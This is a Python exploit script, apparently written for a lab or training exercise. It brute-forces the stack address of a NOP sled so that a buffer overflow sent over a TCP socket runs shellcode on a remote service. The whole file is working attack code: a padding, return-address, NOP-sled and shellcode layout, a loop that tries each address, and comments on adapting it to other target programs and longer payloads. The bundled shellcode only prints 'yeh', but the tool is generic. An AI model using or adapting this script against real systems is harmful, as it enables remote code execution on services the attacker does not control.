#!/usr/bin/python3

# Playground
# because the funnest part is when you go down the slide
#
# Brute force find the address on the stack where the NOP sled is.
# This found address is the value you overwrite the return address with.
# This address will be either the start of the shellcode or
# somewhere in the NOP slide
#
# By CLonsdale
#
# !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
# WARNING, since the test payload may be shorter than the actual payload
# The address you get back may need to be subtracted to ensure you start
# at the beginning of the payload
# !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

import socket
import struct
import time

# Network Parameters
####################################################
IP = "172.16.59.128"
PORT = 5004
####################################################

# Hack parameters
####################################################
PAYLOAD = b"\xba\x04\x00\x00\x00\x68\x79\x65\x68\x00\x89\xe1\xbb\x04\x00\x00\x00\xb8\x04\x00\x00\x00\xcd\x80\xb8\x01\x00\x00\x00\xcd\x80"
BUF_SIZE = 512
GARBAGE_SIZE = 48
####################################################

NOP = b"\x90"
ADDRESS_LENGTH = 4 # bytes
SLED_SIZE = BUF_SIZE - len(PAYLOAD) - GARBAGE_SIZE - ADDRESS_LENGTH
GARBAGE = b"A" * GARBAGE_SIZE
NOP_SLED = NOP * SLED_SIZE

# Depending on your position in the stack, you might want to go from 0xffffffff down to 0xffff0000
# instead of the current way, in which case, you can change the start and end addresses
# and step needs to be a negative number
#
def bruteForceAddress(output_validation, start=0xffff0000, end=0xffffffff, step=SLED_SIZE, debug=False):
    for addr in range(start, end, step):
        # Convert address to little-endian
        address = struct.pack('<I', addr)

        exploit = GARBAGE + address + NOP_SLED + PAYLOAD

        sock = socket.create_connection((IP, PORT))

        # This will need to be changed depending on the program you're trying to hack
        sock.recv(1024) # Recv the input prompt
        sock.sendall(exploit)
        sock.recv(1024) # Recv error message
        output = sock.recv(1024) # Recv our exploits output

        if debug: 
            # Debug in big-endian
            print(format(addr, '0x'))

        if output.startswith(output_validation):
            return "".join("\\x" + format(byte, '0x') for byte in address)

        # Depending on the program, the time may need to be adjusted
        time.sleep(2.25)

if __name__ == "__main__":
    # Takes 4 mins to run
    print(bruteForceAddress(b"yeh"))
